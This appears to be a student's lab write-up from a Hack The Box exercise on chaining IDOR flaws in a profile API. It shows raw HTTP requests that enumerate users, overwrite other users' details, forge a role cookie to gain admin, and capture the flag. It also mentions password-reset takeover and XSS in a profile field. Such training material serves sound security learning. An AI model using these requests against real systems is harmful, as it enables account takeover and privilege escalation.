# Chaining IDOR Vulnerabilities

## Information Disclosure

GET /profile/api.php/profile/2 HTTP/1.1

{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}

## Modifying Other Users' Details

--> Using the uuid previously obtained to modify user information

PUT /profile/api.php/profile/2
"uuid": "4a9bd19b3b8676199592a346051f950c"

{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "pwned",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}

Other attacks :
- Modifying a user's email address and then requesting a password reset link
- Placing an XSS payload in the 'about' field

## Chaining Two IDOR Vulnerabilities

Write a script to enumerate all users, similarly to what we did previously :

{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}

--> Use that to modify our role to web_admin

Set our Cookie :

Cookie: role=web_admin

## LAB

Cookie: role=web_admin

GET /profile/api.php/profile/1 HTTP/1.1
Host: 94.237.55.163:30646
Content-Length: 208
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-type: application/json
Accept: */*
Origin: http://94.237.55.163:30646
Referer: http://94.237.55.163:30646/profile/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: role=employee
Connection: close

{"uid":1,"uuid":"40f5888b67c748df7efba008e7c2f9d2","role":"web_admin","full_name":"Amy Lindon","email":"a_lindon@employees.htb","about":"A Release is like a boat. 80% of the holes plugged is not good enough."}


- Burp Suite : Intruder

GET /profile/api.php/profile/§1§ HTTP/1.1
Host: 94.237.55.163:30646
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: */*
Referer: http://94.237.55.163:30646/profile/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: role=web_admin

{"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"admin@employees.htb","about":"Never gonna give you up, Never gonna let you down"}

flag@idor.htb

PUT /profile/api.php/profile/10
"uuid": "bfd92386a1b48076792e68b596846499"

{
    "uid":"10",
    "uuid":"bfd92386a1b48076792e68b596846499",
    "role":"staff_admin",
    "full_name":"admin",
    "email": "flag@idor.htb",
    "about":"Never gonna give you up, Never gonna let you down"
}


PUT /profile/api.php/profile/10 HTTP/1.1
Host: 94.237.55.163:55840
Content-Length: 208
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-type: application/json
Accept: */*
Origin: http://94.237.55.163:55840
Referer: http://94.237.55.163:55840/profile/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: role=staff_admin
Connection: close

{
    "uid":"10",
    "uuid":"bfd92386a1b48076792e68b596846499",
    "role":"staff_admin",
    "full_name":"admin",
    "email": "flag@idor.htb",
    "about":"Never gonna give you up, Never gonna let you down"
}

HTB{1_4m_4n_1d0r_m4573r}